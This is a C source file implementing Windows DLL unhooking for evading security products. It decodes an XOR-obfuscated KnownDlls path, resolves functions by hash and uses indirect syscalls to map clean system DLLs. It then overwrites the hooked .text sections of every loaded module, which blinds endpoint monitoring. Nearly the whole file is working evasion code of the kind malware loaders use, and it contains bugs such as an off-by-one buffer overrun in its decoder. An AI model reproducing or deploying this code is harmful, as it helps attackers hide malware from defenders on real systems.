#include <Windows.h>
#include "Header.h"
#include "Structs.h"






#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }


typedef NTSYSAPI VOID(WINAPI* fnRtlInitUnicodeString)(
    PUNICODE_STRING         DestinationString,
    PCWSTR					SourceString
    );

#define ODDKey  0xf4
#define EVENKey 0xc5

BYTE XORbyOffset(unsigned char buf, int Offset) {

	BYTE R = (BYTE)buf;

	R ^= (ODDKey - EVENKey);

	if (Offset % 2 == 0) {
		R ^= EVENKey;
	}
	else {
		R ^= ODDKey;
	}

	return (BYTE)R;
}


void XORDec(unsigned char* Buf, SIZE_T SizeOfBuf) {
	for (int i = 0; i < SizeOfBuf + 1; i++) {
		Buf[i] = (unsigned char)XORbyOffset(Buf[i], i);
	}
}



LPVOID RetrieveKnownDll(PWSTR name) {

	PVOID addr = NULL;
	ULONG_PTR size = NULL;
	HANDLE section = INVALID_HANDLE_VALUE;
	UNICODE_STRING uni;
	OBJECT_ATTRIBUTES oa;
	NTSTATUS status;


	char KnownDlls[11] = {
		0xb6, 0x90, 0x84, 0xb4, 0x9d, 0xb5, 0xae, 0xb7, 0x86, 0xa8, 0xb6
	};


	WCHAR buffer[MAX_PATH];
	WCHAR StrDec[11];


	XORDec(KnownDlls, sizeof(KnownDlls));

	AToW(StrDec, KnownDlls, sizeof(KnownDlls));

	_strcpy(buffer, StrDec);    
	
	_strcat(buffer, name);


	
	fnRtlInitUnicodeString RtlInitUnicodeString = (fnRtlInitUnicodeString)GetProcAddressF(NTDLLDLL_Rotr32, RtlInitUnicodeString_Rotr32);
	if (RtlInitUnicodeString == NULL) {
		return NULL;
	}

	RtlInitUnicodeString(&uni, buffer);

	InitializeObjectAttributes(
		&oa,
		&uni,
		OBJ_CASE_INSENSITIVE,
		NULL,
		NULL
	);

	if (!FetshSyscall(NtOpenSection_Rotr32))
		return;
	PlaceSysNmbr(FetshSysNmbr());
	if (!NT_SUCCESS((status = SysExec(&section, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &oa)))) {
		return NULL;
	}

	if (section == INVALID_HANDLE_VALUE)
		return NULL;


	if (!FetshSyscall(NtMapViewOfSection_Rotr32))
		return;
	PlaceSysNmbr(FetshSysNmbr());
	if (!NT_SUCCESS((status = SysExec(section, NtCurrentProcess(), &addr, 0, 0, NULL, &size, 1, 0, PAGE_READONLY)))) {
		return NULL;
	}

	return addr;
}


BOOL GetTxtSextionOfModuleX(PVOID pModule, PIMAGE_NT_HEADERS pNtHeaders, PSIZE_T TxtSize, PVOID* TxtAdd) {
	for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pImgSec = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pNtHeaders) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
		if ((*(ULONG*)pImgSec->Name | 0x20202020) == 'xet.') {
			*TxtSize = pImgSec->Misc.VirtualSize;
			*TxtAdd = (PVOID)((ULONG_PTR)pModule + pImgSec->VirtualAddress);
			return TRUE;
		}
	}
	return FALSE;
}


BOOL FixAllDlls() {
	PPEB pPeb = (PPEB)__readgsqword(0x60);

	LIST_ENTRY* Head = &pPeb->Ldr->InMemoryOrderModuleList;
	LIST_ENTRY* Next = Head->Flink;

	PVOID pTxtAddress = NULL;
	SIZE_T sTxtSize = NULL;

	PVOID pTxtAddress2 = NULL;
	SIZE_T sTxtSize2 = NULL;


	NTSTATUS STATUS = 0x0;

	DWORD OldProtection = NULL;
	DWORD Older = NULL;

	while (Next != Head) {
		LDR_DATA_TABLE_ENTRY* pLdte = (LDR_DATA_TABLE_ENTRY*)((PBYTE)Next - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));
		UNICODE_STRING* FullDllName = &pLdte->FullDllName;
		UNICODE_STRING* BaseDllName = (UNICODE_STRING*)((PBYTE)FullDllName + sizeof(UNICODE_STRING));

		LPVOID RemoteModule = RetrieveKnownDll(BaseDllName->Buffer);
		LPVOID LocalModule = (LPVOID)(pLdte->DllBase);

		if (RemoteModule != NULL && LocalModule != NULL) {

			PIMAGE_DOS_HEADER LocalImgDosHdr = (PIMAGE_DOS_HEADER)LocalModule;
			PIMAGE_NT_HEADERS LocalImgNtHdr = (PIMAGE_NT_HEADERS)((PBYTE)LocalModule + LocalImgDosHdr->e_lfanew);
			PIMAGE_EXPORT_DIRECTORY LocalExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)LocalModule + LocalImgNtHdr->OptionalHeader.DataDirectory[0].VirtualAddress);

			if (LocalImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE || LocalImgNtHdr->Signature != IMAGE_NT_SIGNATURE) {
				return FALSE;
			}

			PIMAGE_DOS_HEADER RemoteImgDosHdr = (PIMAGE_DOS_HEADER)RemoteModule;
			PIMAGE_NT_HEADERS RemoteImgNtHdr = (PIMAGE_NT_HEADERS)((PBYTE)RemoteModule + RemoteImgDosHdr->e_lfanew);
			PIMAGE_EXPORT_DIRECTORY RemoteExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)RemoteModule + RemoteImgNtHdr->OptionalHeader.DataDirectory[0].VirtualAddress);

			if (RemoteImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE || RemoteImgNtHdr->Signature != IMAGE_NT_SIGNATURE) {
				return FALSE;
			}

			if (!GetTxtSextionOfModuleX((PVOID)LocalModule, LocalImgNtHdr, &sTxtSize, &pTxtAddress)) {
				return FALSE;
			}

			if (!FetshSyscall(NtProtectVirtualMemory_Rotr32))
				return FALSE;
			PlaceSysNmbr(FetshSysNmbr());
			if (!NT_SUCCESS((STATUS = SysExec(NtCurrentProcess(), &pTxtAddress, &sTxtSize, PAGE_EXECUTE_WRITECOPY, &OldProtection)))) {
				return FALSE;
			}

			if (!GetTxtSextionOfModuleX((PVOID)RemoteModule, RemoteImgNtHdr, &sTxtSize2, &pTxtAddress2)) {
				return FALSE;
			}
			CP2(pTxtAddress, pTxtAddress2, sTxtSize);


			if (!FetshSyscall(NtProtectVirtualMemory_Rotr32))
				return FALSE;
			PlaceSysNmbr(FetshSysNmbr());
			if (!NT_SUCCESS((STATUS = SysExec(NtCurrentProcess(), &pTxtAddress, &sTxtSize, OldProtection, &Older)))) {
				return FALSE;
			}

			if (!FetshSyscall(NtUnmapViewOfSection_Rotr32))
				return FALSE;
			PlaceSysNmbr(FetshSysNmbr());
			if (!NT_SUCCESS((STATUS = SysExec(NtCurrentProcess(), RemoteModule)))) {
				return FALSE;
			}

		}

		Next = Next->Flink;

	}


	return TRUE;
}




